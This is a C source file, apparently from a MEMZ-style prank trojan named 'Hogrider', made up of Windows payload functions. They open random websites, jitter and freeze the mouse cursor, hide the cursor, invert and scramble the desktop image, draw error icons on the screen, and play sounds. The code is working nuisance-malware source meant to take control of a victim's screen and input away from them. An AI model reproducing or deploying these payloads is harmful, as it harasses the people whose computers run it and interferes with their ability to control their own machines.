#include <Windows.h>
#include "data.c"
#include "utils.c"

void showMsgBox()
{
    MessageBox(NULL, msg, "Hogrider", MB_OK);
}

void payloadExecute()
{

    ShellExecuteA(NULL, "open", (LPCSTR)sites[random() % nSites], NULL, NULL, SW_SHOWDEFAULT);
}

void payloadCursor()
{

    POINT cursor;
    GetCursorPos(&cursor);
    SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (random() / 2200 + 2)), cursor.y + (random() % 3 - 1) * (random() % (random() / 2200 + 2)));
}

void payloadBlink()
{
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
    RECT rekt;
    GetWindowRect(hwnd, &rekt);
    BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
    ReleaseDC(hwnd, hdc);
}

void payloadSound()
{
    PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_SYNC);
}

void payloadPuzzle()
{
    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
    RECT rekt;
    GetWindowRect(hwnd, &rekt);

    int x1 = rand() % (rekt.right - 100);
    int y1 = rand() % (rekt.bottom - 100);
    int x2 = rand() % (rekt.right - 100);
    int y2 = rand() % (rekt.bottom - 100);
    int width = rand() % 600;
    int height = rand() % 600;

    BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
    ReleaseDC(hwnd, hdc);
}

void payloadDrawErrors()
{

    int ix = GetSystemMetrics(SM_CXICON) / 2;
    int iy = GetSystemMetrics(SM_CYICON) / 2;

    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);

    POINT cursor;
    GetCursorPos(&cursor);

    DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

    if (random() % (int)(10 / (500.0 + 1) + 1) == 0)
    {
        DrawIcon(hdc, random(), random(), LoadIcon(NULL, IDI_WARNING));
    }

    ReleaseDC(hwnd, hdc);
}

void payloadPIP()
{

    HWND hwnd = GetDesktopWindow();
    HDC hdc = GetWindowDC(hwnd);
    RECT rekt;
    GetWindowRect(hwnd, &rekt);
    StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
    ReleaseDC(hwnd, hdc);
}

void disableMouse()
{
    RECT desktop;
    const HWND hDesktop = GetDesktopWindow();
    GetWindowRect(hDesktop, &desktop);
    ClipCursor(&desktop);
    ShowCursor(FALSE);
}

void enableMouse()
{
    ClipCursor(NULL);
    ShowCursor(TRUE);
}

void freezeMouse()
{
    POINT cursorPos;
    if (GetCursorPos(&cursorPos))
    {
        RECT cursorRect = {cursorPos.x, cursorPos.y, cursorPos.x + 1, cursorPos.y + 1};
        ClipCursor(&cursorRect);
    }
}